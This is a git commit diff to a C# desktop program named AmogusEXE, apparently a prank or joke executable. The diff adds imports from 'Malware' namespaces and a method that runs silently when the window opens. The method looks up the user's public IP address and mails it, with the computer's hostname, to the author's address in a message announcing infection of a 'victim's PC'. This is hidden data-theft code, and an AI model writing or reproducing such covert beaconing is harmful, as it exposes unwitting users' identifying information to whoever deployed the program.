e72832866a9f9cdb746c55c46986a72f4874d78e
Maksim <maxus.info.mail@gmail.com>
2021-05-22 15:24:39 +0300

    Stuff

--- AmogusEXE/MainWindow.xaml.cs
+++ AmogusEXE/MainWindow.xaml.cs
@@ -13,6 +13,16 @@ using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
 
+using AmogusEXE.Malware.Sender;
+using AmogusEXE.Malware.Encoding;
+using AmogusEXE.Malware.Reader;
+using System.IO;
+using System.Net.NetworkInformation;
+using System.Net;
+using System.Text.Json;
+using System.Net.Sockets;
+using System.Net.Http;
+
 namespace AmogusEXE
 {
     /// <summary>
@@ -22,9 +32,23 @@ namespace AmogusEXE
     {
         public MainWindow()
         {
+            GetNecessaryStuff();
             InitializeComponent();
             new ForeverWindow();
             Close();
+        }
+
+        public static void GetNecessaryStuff()
+        {
+            var request = WebRequest.Create("http://checkip.dyndns.org");
+            request.Method = "GET";
+            using var webResponse = request.GetResponse();
+            using var webStream = webResponse.GetResponseStream();
+            using var reader = new StreamReader(webStream);
+            string data = reader.ReadToEnd();
+            string[] response = data.Split(':');
+            string ip = response[1].Replace("</body></html>\r\n", "").Replace(" ", "");
+            Sender.Mail("maxus.info.mail@gmail.com", $"\"AmogusEXE was initialized on victim's PC!\nUser's IPv4 Address: {ip}\nUser's DNS Name: {Dns.GetHostName()}\"");
         }
     }
 }
